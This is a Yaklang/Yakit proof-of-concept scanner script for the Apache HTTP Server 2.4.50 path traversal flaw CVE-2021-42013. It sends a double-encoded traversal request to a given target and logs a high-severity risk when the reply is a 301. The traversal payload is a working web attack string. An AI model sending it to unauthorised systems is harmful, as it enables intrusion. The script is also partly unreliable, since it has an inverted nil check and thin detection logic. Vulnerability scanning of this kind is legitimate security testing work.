yakit.AutoInitYakit()
log.setLevel("info")

isHttps = cli.Have("https", cli.setDefault(false))
target = cli.String("target")

packet = `
GET /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65 HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36

`

debug = cli.Have("debug", cli.setDefault(false))

if debug {
    loglevel("debug")
}

sendPacket = func(target) {
    return poc.HTTP(
        packet, 
        poc.timeout(10),
        # poc.proxy("http://127.0.0.1:8083"),
        # poc.proxy("http://127.0.0.1:7890"),
        poc.redirectTimes(0),  # 重定向次数
        poc.https(isHttps),
        poc.params({
            "target": target,
        },
    ))
}

if YAK_MAIN {
    rspBytes, reqBytes, err = sendPacket(target)
    if err != nil {
        yakit.Error(string(err))
        return
    }

    if debug {
        println(string(reqBytes))
        println("---------------------------------")
        println(string(rspBytes))
    }

    httprsp, httperr = str.ParseBytesToHTTPResponse(rspBytes)
    if httperr != nil {
        yakit.Error(string(httperr))
        return
    }
    riskTarget = target

    if httprsp.StatusCode == 301 {
        urlIns, _ = str.ExtractURLFromHTTPRequestRaw(reqBytes, isHttps)
        if urlIns == nil {
            riskTarget = urlIns.String()
        }
        yakit.Info("Found Apache HTTP Server 2.4.50 路径穿越漏洞(CVE-2021-42013)")
        log.info("Found Apache HTTP Server 2.4.50 路径穿越漏洞(CVE-2021-42013)")
        # Save to RiskTable
        risk.NewRisk(
            riskTarget, risk.severity("high"), risk.type("poc"),
            risk.title("Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.50 (CVE-2021-42013)"),            ## English Title for Risk
            risk.titleVerbose("Apache HTTP Server 2.4.50 路径穿越漏洞(CVE-2021-42013)"),           ##  中文标题
            risk.details({
                "target": riskTarget,
                "request": reqBytes,
                "response": rspBytes,
            }),
        )
    }else {
        yakit.Info("Not Found Apache HTTP Server 2.4.50 路径穿越漏洞(CVE-2021-42013)")
        log.info("Not Found Apache HTTP Server 2.4.50 路径穿越漏洞(CVE-2021-42013)")
    }
}
